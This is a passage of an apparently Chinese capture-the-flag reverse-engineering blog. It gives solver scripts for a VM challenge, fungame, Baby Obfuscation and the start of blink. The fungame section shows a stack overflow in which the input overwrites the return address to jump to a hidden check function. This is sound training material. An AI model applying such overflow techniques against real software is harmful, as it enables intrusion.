class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VM</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, opcodes</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.opcodes = opcodes</span><br><span class="line">        self.r0 = <span class="number">0</span></span><br><span class="line">        self.r1 = <span class="number">18</span></span><br><span class="line">        self.r2 = <span class="number">0</span></span><br><span class="line">        self.r3 = <span class="number">0</span></span><br><span class="line">        self.ip = <span class="number">0</span></span><br><span class="line">        self.memory = [<span class="number">0</span>] * <span class="number">0x512</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">memory_operate</span>(<span class="params">self</span>):</span></span><br><span class="line">        v = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">bytes</span>(self.opcodes[self.ip + <span class="number">2</span>:self.ip + <span class="number">6</span>]))[<span class="number">0</span>]</span><br><span class="line">        op = self.opcodes[self.ip + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> op == <span class="number">0xE1</span>:</span><br><span class="line">            self.r0 = self.memory[v]</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE2</span>:</span><br><span class="line">            self.r1 = self.memory[v] </span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE3</span>:</span><br><span class="line">            self.r2 = self.memory[v]</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE4</span>:</span><br><span class="line">            self.memory[v] = self.r0</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE5</span>:</span><br><span class="line">            self.r3 = self.memory[v]</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE7</span>:</span><br><span class="line">            self.memory[v] = self.r1</span><br><span class="line">        </span><br><span class="line">        self.ip += <span class="number">6</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> opcodes[self.ip] != <span class="number">0xF4</span>:</span><br><span class="line">            op = opcodes[self.ip]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="number">0xF1</span>:</span><br><span class="line">                self.memory_operate()</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF2</span>:</span><br><span class="line">                self.r0 ^= self.r1</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF5</span>: <span class="comment"># read flag and check flag length</span></span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF4</span>:</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF7</span>:</span><br><span class="line">                self.r0 *= self.r3</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF8</span>:</span><br><span class="line">                self.r0, self.r1 = self.r1, self.r0</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF6</span>:</span><br><span class="line">                self.r0 = self.r2 + <span class="number">2</span> * self.r1 + <span class="number">3</span> * self.r0</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">vm = VM(opcodes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    vm.memory[i] = x[i]</span><br><span class="line"></span><br><span class="line">vm.run()</span><br><span class="line"></span><br><span class="line">cmp_data = [<span class="number">0x46</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x7B</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x66</span>, <span class="number">0x4D</span>, <span class="number">0x74</span>, <span class="number">0x7E</span>, <span class="number">0x73</span>, <span class="number">0x75</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    s.add(vm.memory[i+<span class="number">32</span>] == cmp_data[i])</span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    flag += <span class="built_in">bytes</span>([m[i].as_long()])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到假flag</p><p>根据提示，对<code>memory</code>进行交叉引用查找找到一个根本没调用的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 sub_F00()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  unsigned __int64 v2; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; flag_len - 1 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( memory[i] != byte_202020[i] )</span><br><span class="line">      exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及在opcodes下面又得到一串opcodes,</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211018162413492.png" alt="image-20211018162413492"></p><p>最终得到真flag解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcodes = [<span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">vm = VM(opcodes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    vm.memory[i] = x[i]</span><br><span class="line"></span><br><span class="line">vm.run()</span><br><span class="line"></span><br><span class="line">cmp_data = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp_data)):</span><br><span class="line">    s.add(vm.memory[i] == cmp_data[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    flag += <span class="built_in">bytes</span>([m[i].as_long()])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-fungame"><a href="#ACTF新生赛2020-fungame" class="headerlink" title="[ACTF新生赛2020]fungame"></a>[ACTF新生赛2020]fungame</h3><p>flag分为两部分, 第一部分是简单的异或</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_401340</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> i; <span class="comment">// [esp+1Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)a1[i] ^ (<span class="keyword">unsigned</span> __int8)y1[i]) != y2[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是flag提交不对，往后看有个栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4013BA</span><span class="params">(<span class="keyword">char</span> *Source)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Destination[<span class="number">12</span>]; <span class="comment">// [esp+1Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Source);                  <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="built_in">strcpy</span>(x, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对x进行交叉引用查询</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_40233D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Str2[<span class="number">13</span>]; <span class="comment">// [esp+13h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Str1[<span class="number">16</span>]; <span class="comment">// [esp+20h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">12</span>]; <span class="comment">// [esp+30h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input again:&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(Str2, <span class="string">&quot;YTFzMF9wV24=&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str1));</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  sub_402421((<span class="keyword">int</span>)Str, v3, (<span class="keyword">int</span>)Str1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, Str2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s%s&quot;</span>, x, Str);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则我们的输入需要跳到第二个校验函数, 根据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000C Destination     db 12 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 Source          dd ?   </span><br></pre></td></tr></table></figure><p>我们需要覆盖<code>r</code>, 则需要往后多输入<code>0x3d,0x23,0x40</code>（小端序)</p><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">y2 = [<span class="number">0x71</span>, <span class="number">0x04</span>, <span class="number">0x61</span>, <span class="number">0x58</span>, <span class="number">0x27</span>, <span class="number">0x1E</span>, <span class="number">0x4B</span>, <span class="number">0x22</span>, <span class="number">0x5E</span>, <span class="number">0x64</span>, <span class="number">0x03</span>, <span class="number">0x26</span>, <span class="number">0x5E</span>, <span class="number">0x17</span>, <span class="number">0x3C</span>, <span class="number">0x7A</span>]</span><br><span class="line">y1 = [<span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0x3E</span>, <span class="number">0x69</span>, <span class="number">0x54</span>, <span class="number">0x41</span>, <span class="number">0x18</span>, <span class="number">0x4D</span>, <span class="number">0x6E</span>, <span class="number">0x3B</span>, <span class="number">0x65</span>, <span class="number">0x53</span>, <span class="number">0x30</span>, <span class="number">0x79</span>, <span class="number">0x45</span>, <span class="number">0x5B</span>]</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(y1, y2):</span><br><span class="line">    s.append(i ^ j)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">b&quot;YTFzMF9wV24=&quot;</span></span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(s + [<span class="number">0x3d</span>,<span class="number">0x23</span>,<span class="number">0x40</span>]) + plain</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-Baby-Obfuscation"><a href="#NPUCTF2020-Baby-Obfuscation" class="headerlink" title="[NPUCTF2020]Baby Obfuscation"></a>[NPUCTF2020]Baby Obfuscation</h3><p>ida打开看到主要函数， 分析一下使用的函数</p><h4 id="F0X1"><a href="#F0X1" class="headerlink" title="F0X1"></a>F0X1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">F0X1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( b )</span><br><span class="line">    <span class="keyword">return</span> F0X1(b, a % b);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>欧几里得算法求最大公约数</p><h4 id="F0X2"><a href="#F0X2" class="headerlink" title="F0X2"></a>F0X2</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">F0X2</span><span class="params">(<span class="keyword">bool</span> a, <span class="keyword">bool</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a == b &amp;&amp; !a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于与， 两边同时为1时才返回1</p><h4 id="F0X3"><a href="#F0X3" class="headerlink" title="F0X3"></a>F0X3</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">F0X3</span><span class="params">(<span class="keyword">bool</span> a, <span class="keyword">bool</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">bool</span> v3; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v2 = F0X2(b, b);</span><br><span class="line">  v3 = F0X2(a, a);</span><br><span class="line">  <span class="keyword">return</span> F0X2(v3, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与F0X2同理</p><h4 id="F0X4"><a href="#F0X4" class="headerlink" title="F0X4"></a>F0X4</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl F0X4(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">  return ~(~a + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于<code>a - b</code></p><h4 id="F0X5"><a href="#F0X5" class="headerlink" title="F0X5"></a>F0X5</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">F0X5</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ans; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ans = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( b )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (b &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      ans *= a;</span><br><span class="line">    a *= a;</span><br><span class="line">    b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于 a^b (这里^是次方的意思)</p><h4 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h4><p>则分析函数可得主要加密就红框这三条</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211018173703390.png" alt="image-20211018173703390"></p><p>实际上就是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s[i] = <span class="built_in">input</span>[i] - A0X4[(i - <span class="number">1</span>) % <span class="number">4</span>]</span><br><span class="line">s[i] ^= A0X4[(i - <span class="number">1</span>) % <span class="number">4</span>]</span><br><span class="line">s[i] *= <span class="number">10</span></span><br></pre></td></tr></table></figure><p>解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A0X6 = [<span class="number">0x0</span>, <span class="number">0x00001E79</span>, <span class="number">0x00001E79</span>, <span class="number">0x00002135</span>, <span class="number">0x0000170D</span>, <span class="number">0x00001F41</span>, <span class="number">0x00001901</span>, <span class="number">0x00002CED</span>, <span class="number">0x000011F9</span>, <span class="number">0x00002649</span>, <span class="number">0x00002581</span>, <span class="number">0x00002DB5</span>, <span class="number">0x000014B5</span>, <span class="number">0x000025E5</span>, <span class="number">0x00002A31</span>, <span class="number">0x000030D5</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F0X4</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ~(~a + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">A0X = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> A0X6:</span><br><span class="line">   A0X.append(F0X4(i, <span class="number">1</span>) // <span class="number">10</span>) </span><br><span class="line"><span class="built_in">print</span>(A0X)</span><br><span class="line"></span><br><span class="line">A0X4=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(A0X)):</span><br><span class="line">    A0X[i] //= <span class="number">10</span></span><br><span class="line">    A0X[i] ^= A0X4[(i - <span class="number">1</span>) % <span class="number">4</span>]</span><br><span class="line">    A0X[i] += A0X4[(i - <span class="number">1</span>) % <span class="number">4</span>]</span><br><span class="line">    A0X[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(A0X[<span class="number">1</span>:]))</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-blink"><a href="#BSidesSF2019-blink" class="headerlink" title="[BSidesSF2019]blink"></a>[BSidesSF2019]blink</h3><p>jadx打开，看到一个图片</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211018180801689.png" alt="image-20211018180801689"></p><p>写脚本解析一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = base64.b64decode(<span 